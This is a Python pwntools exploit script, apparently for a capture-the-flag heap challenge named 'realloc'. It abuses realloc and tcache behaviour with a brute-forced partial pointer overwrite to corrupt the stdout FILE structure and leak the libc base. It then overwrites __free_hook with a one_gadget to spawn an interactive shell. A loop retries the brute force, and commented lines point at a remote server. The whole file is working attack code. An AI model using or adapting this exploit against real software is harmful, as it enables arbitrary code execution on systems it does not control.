#coding:utf-8
from pwn import *

context.log_level = 'debug'
elf = ELF("./realloc")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#p = process('./realloc_magic')

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def sl(x):
 p.sendline(x)

def sd(x):
 p.send(x)

def ru(x):
 p.recvuntil(x)

def free():
 ru('>> ')
 sl('2')

def realloc(size,data):
 ru('>> ')
 sl('1')
 ru('Size?\n')
 sl(str(size))
 if size>0:
  ru('Content?\n')
  sd(data)

def ba():
 ru('>> ')
 sl('666')
def realloc2(size,content):
	ru(">> ")
	sl('1')
	ru("Size?")
	sl(str(size))
	if size>0:
		ru("Content?")
		sd(content)
def pwn():

 realloc(0x70,'AAAA')
 realloc(0,'')
 realloc(0x100,'BBBB')
 realloc(0,'')
 realloc(0xe0,'CCCC')
 realloc(0,'')
 realloc(0x100,'FFFF')
 # bk(0)
 for i in range(7):
  free()
 realloc(0,'')

 realloc(0x70,'"AAAA')
 
 #realloc(0x180,chr(0) * 0x78 + p64(0x41) + '\x1d\x17')
 realloc(0x180, chr(0) * 0x78 + p64(0x41) + '\x1d\x07')
 # debug(0x000000000000A2A)
 realloc(0,'')
 
 realloc(0x100,'AAAA')
 realloc(0,'')
 
 realloc(0x100,'\x00'*0x43 + p64(0xfbad1800) + p64(0)*3 + '\x00')
 
 rc(0x8)
 libc_base = u64(rc(8))-0x3ed8b0
 print "libc_base--->" + hex(libc_base)
 free_hook = libc_base + libc.sym["__free_hook"]
 one_gadget = libc_base + 0x4f322
 info("libc_base 0x%x", libc_base)
 info("free_hook 0x%x", free_hook)
 info("one_gadget 0x%x", one_gadget)
 ba()
 
 ru('>> ')
 sl('1')
 ru('Size?')
 sl(str(0x180))
 ru('Content?')
 sd(chr(0) * 0x78 + p64(0x111) + p64(free_hook))
 realloc2(0, '')
 realloc2(0x30, 'DDDD')
 realloc2(0, '')
 realloc2(0x30, p64(one_gadget))
 free()
 #gdb.attach(p)
 p.interactive()

p = process('./realloc')
#   #p = remote('39.97.182.233',43184)
# pwn()
while True:
 try:
  p = process('./realloc')
  #p = remote('39.97.182.233',43184)
  pwn()
  
 except Exception as e:
  pass